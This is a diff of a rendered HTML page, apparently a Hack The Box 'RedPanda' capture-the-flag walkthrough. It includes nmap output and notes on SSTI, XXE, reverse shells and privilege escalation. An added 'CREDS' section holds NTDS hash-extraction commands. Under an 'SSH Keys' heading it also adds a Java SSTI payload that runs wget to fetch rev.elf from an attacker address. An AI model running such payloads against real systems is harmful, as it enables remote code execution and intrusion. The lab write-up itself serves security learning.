+</span></span><span style="display:flex;"><span>  SF:00<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20GET,HEAD,OPTIONS<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>  SF:20Fri,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2015:20:47<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  SF:r<span style="color:#ae81ff">\n\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,24E,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20t
+</span></span><span style="display:flex;"><span>  SF:ext/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Language:<span style="color:#ae81ff">\x</span>20en<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  SF:0435<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Fri,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2015:20:47<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connec
+</span></span><span style="display:flex;"><span>  SF:tion:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html&gt;&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;&lt;head&gt;&lt;tit
+</span></span><span style="display:flex;"><span>  SF:le&gt;HTTP<span style="color:#ae81ff">\x</span>20Status<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request&lt;/title&gt;&lt;styl
+</span></span><span style="display:flex;"><span>  SF:e<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/css<span style="color:#ae81ff">\&#34;</span>&gt;body<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-family:Tahoma,Arial,sans-serif;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>  SF:20h1,<span style="color:#ae81ff">\x</span>20h2,<span style="color:#ae81ff">\x</span>20h3,<span style="color:#ae81ff">\x</span>20b<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>color:white;background-color:#525D76;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>  SF:h1<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:22px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h2<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:16px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h3<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:
+</span></span><span style="display:flex;"><span>  SF:14px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20p<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:12px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>color:black;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\.</span>line<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>h
+</span></span><span style="display:flex;"><span>  SF:eight:1px;background-color:#525D76;border:none;<span style="color:#f92672">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h
+</span></span><span style="display:flex;"><span>  SF:1&gt;HTTP<span style="color:#ae81ff">\x</span>20Status<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request&lt;/h1&gt;&lt;/body&gt;&lt;/
+</span></span><span style="display:flex;"><span>  SF:html&gt;<span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Device type: general purpose
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Running: Linux 5.X
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OS CPE: cpe:/o:linux:linux_kernel:5.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OS details: Linux 5.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Network Distance: 2 hops
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds</span></span></span></code></pre></div>
     
 </div>
 </li>
@@ -1216,7 +1242,7 @@
 <li><figure><img src="/ox-hugo/2024-12-27-153003_.png">
 </figure>
 </li>
-<li>+Note+: I use <code>sed</code> to put the output across multiple lines for a nicer output.</li>
+<li><del>Note</del>: I use <code>sed</code> to put the output across multiple lines for a nicer output.</li>
 </ul>
 </li>
 </ul>
@@ -1286,7 +1312,7 @@
 </li>
 <li>Looking at the output it renders an xml table based on the author parameters name, however the as it&rsquo;s a table it will most likely be utilizing SST&rsquo;s (Server Side Templates) which means it may be susceptible to SSTI (Server Side Template Injection)
 <ul>
-<li>+Note+: After some investigating it was not. However it did come in useful later.</li>
+<li><del>Note</del>: After some investigating it was not. However it did come in useful later.</li>
 </ul>
 </li>
 </ul>
@@ -1432,7 +1458,7 @@
 <li><figure><img src="/ox-hugo/2025-01-03-132019_.png">
 </figure>
 </li>
-<li>+Note+: You want to ensure that URL encoding is OFF.
+<li><del>Note</del>: You want to ensure that URL encoding is OFF.
 <ul>
 <li><figure><img src="/ox-hugo/2024-12-20-173531_.png">
 </figure>
@@ -1469,7 +1495,7 @@
 </ul>
 </li>
 <li>
-<p>+Note+: Realistically this is something I should have noticed earlier, I usually make a point of reading source code when I first look at a page and overlooked this.</p>
+<p><del>Note</del>: Realistically this is something I should have noticed earlier, I usually make a point of reading source code when I first look at a page and overlooked this.</p>
 </li>
 </ul>
 <h5 id="fuzzing-attempt-2">Fuzzing Attempt 2:</h5>
@@ -1741,7 +1767,7 @@
 <li><figure><img src="/ox-hugo/2025-01-03-173948_.png">
 </figure>
 </li>
-<li>+Note+: This is the same for the most of the commands I try. This indicates the command is running but we are not being served the output.</li>
+<li><del>Note</del>: This is the same for the most of the commands I try. This indicates the command is running but we are not being served the output.</li>
 </ul>
 </li>
 </ul>
@@ -1783,7 +1809,7 @@
 </li>
 </ul>
 </li>
-<li>+Note+: Now that I know the host is processing my commands and can make an outbound connection I can do the following:
+<li><del>Note</del>: Now that I know the host is processing my commands and can make an outbound connection I can do the following:
 <ul>
 <li>Create a malicious binary.</li>
 <li>Download it to the host.</li>
@@ -1791,7 +1817,7 @@
 <li>Run it &amp; catch a reverse shell.</li>
 </ul>
 </li>
-<li>+Another Note+: If you&rsquo;re wondering &ldquo;why didn&rsquo;t you just try a reverse shell&rdquo; I did, but a standard bash shell or nc shell would not connect.</li>
+<li><del>Another Note</del>: If you&rsquo;re wondering &ldquo;why didn&rsquo;t you just try a reverse shell&rdquo; I did, but a standard bash shell or nc shell would not connect.</li>
 </ul>
 </li>
 </ul>
@@ -1980,7 +2006,7 @@
 </figure>
 </li>
 <li>The user can write to: <code>/opt/panda_search/redpanda.log</code></li>
-<li>+Note+: I did pursue this but this but it did not work due there being no <code>GLIBC_2.34</code> on the host for the logrotten exploit to work.</li>
+<li><del>Note</del>: I did pursue this but this but it did not work due there being no <code>GLIBC_2.34</code> on the host for the logrotten exploit to work.</li>
 </ul>
 </li>
 </ul>
@@ -2061,7 +2087,7 @@
 <li>
 <p>For full transparency I have done the following checks before moving onto looking at running processes in the next steps. If you just want to see what happens next, skip ahead.</p>
 <ul>
-<li>+Note+: Most of these are shown when executing linpeas, however I often find it easier to manually check if nothing obvious is presenting itself.</li>
+<li><del>Note</del>: Most of these are shown when executing linpeas, however I often find it easier to manually check if nothing obvious is presenting itself.</li>
 </ul>
 </li>
 <li>
@@ -2405,7 +2431,7 @@
 </div>
 </li>
 <li>
-<p><strong>Check which users have login shells</strong>: +do this!!!+</p>
+<p><strong>Check which users have login shells</strong>: <del>do this!!!</del></p>
 
 
 
@@ -2572,7 +2598,7 @@
 </li>
 <li>Looking at the UID we can also see it&rsquo;s running as <code>root</code> as it&rsquo;s <code>UID 0</code></li>
 <li>I leave pspy running and it re-runs exactly 2 minutes later, so there is a cron job scheduled to run this.</li>
-<li>+Note+: There is also a shell script running <code>/root/run_credits.sh</code> however I currently have no way to read this so will focus on the java file.</li>
+<li><del>Note</del>: There is also a shell script running <code>/root/run_credits.sh</code> however I currently have no way to read this so will focus on the java file.</li>
 </ul>
 </li>
 </ul>
@@ -2691,7 +2717,7 @@
 </div>
 <ul>
 <li>A simple check to determine if a filename refers to a JPG image.</li>
-<li>+Note+: This is a very basic check that only looks for &ldquo;.jpg&rdquo; in the filename.</li>
+<li><del>Note</del>: This is a very basic check that only looks for &ldquo;.jpg&rdquo; in the filename.</li>
 </ul>
 </li>
 <li>
@@ -2795,7 +2821,7 @@
 <li>Increments both the total views counter and the specific image&rsquo;s view counter</li>
 <li>Saves the updated XML file
 <ul>
-<li>+Important+: If we can write to this I may be able to xploVV</li>
+<li><del>Important</del>: If we can write to this I may be able to xploVV</li>
 </ul>
 </li>
 </ol>
@@ -2857,7 +2883,7 @@
 <ol>
 <li>Reads the log file line by line:
 <ul>
-<li>+Important+: This is the log file our user has write privileges over so we may be able to inject malicious code by placing it in this file and having it execute.</li>
+<li><del>Important</del>: This is the log file our user has write privileges over so we may be able to inject malicious code by placing it in this file and having it execute.</li>
 </ul>
 </li>
 <li>Skips non-image entries</li>
@@ -2865,7 +2891,7 @@
 <li>Extracts the artist from the image metadata</li>
 <li>Updates view counts in the corresponding artist&rsquo;s XML credit file
 <ul>
-<li>+Important+: As the program parses XML data as one of it&rsquo;s functions we may be able to perform and XXE (XML External Entity Attack)</li>
+<li><del>Important</del>: As the program parses XML data as one of it&rsquo;s functions we may be able to perform and XXE (XML External Entity Attack)</li>
 </ul>
 </li>
 </ol>
@@ -3434,6 +3460,137 @@
 <p>Until next time, hack the planet!</p>
 <p>– Bloodstiller</p>
 <p>– Get in touch bloodstiller at bloodstiller dot com</p>
+<h2 id="9c69d6"><del>CREDS</del>:</h2>
+<h3 id="compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</h3>
+<h4 id="usernames">Usernames:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Administrator%0aGuest%0aRoot%0akrbtgt%0aAdmin">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>Root
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>Admin</span></span></code></pre></div>
+    
+</div>
+<h4 id="passwords">Passwords:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
+    
+</div>
+<h4 id="email-names">Email Names:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
+    
+</div>
+<h4 id="username-and-pass">Username &amp; Pass:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
+    
+</div>
+<h4 id="hashes">Hashes:</h4>
+<ul>
+<li><strong>Extract all hashes from netexec</strong>
+<ul>
+<li><strong>Extract only enabled hashes</strong>:
+<ul>
+<li><code>grep -iv disabled /home/kali/.nxc/logs/*.ntds | cut -d ':' -f2,5 --output-delimiter=' ' | awk '{print $2, $1}'</code></li>
+</ul>
+</li>
+<li><strong>Extract all hashes</strong>
+<ul>
+<li><code>cat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'</code></li>
+<li><del>Note</del>: We need to include disabled hashes to get the krbtgt hash in this method as that account is disabled by default.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
+    
+</div>
+<h3 id="ssh-keys">SSH Keys:</h3>
+<p>*{&quot;&quot;.getClass().forName(&ldquo;java.lang.Runtime&rdquo;).getRuntime().exec(&ldquo;wget <a href="http://10.10.14.131:9000/rev.elf">http://10.10.14.131:9000/rev.elf</a>&rdquo;)}</p>
 
             
         </div>
@@ -3491,7 +3648,7 @@
                 <li>
                     
                         Word Count:
-                        4692
+                        4780
                     
                 </li>
             
@@ -3510,7 +3667,7 @@
                     
                         Last modified: &nbsp;
                         <time>
-                            Jan 12 2025 00:00:00
+                            Oct 10 2024 00:00:00
                         </time>
                     
                 </li>
@@ -3521,6 +3678,9 @@
     </div>
 </footer>
 
+
+        
+        <script src="/js/custom.js"></script>
     </body>
 
     
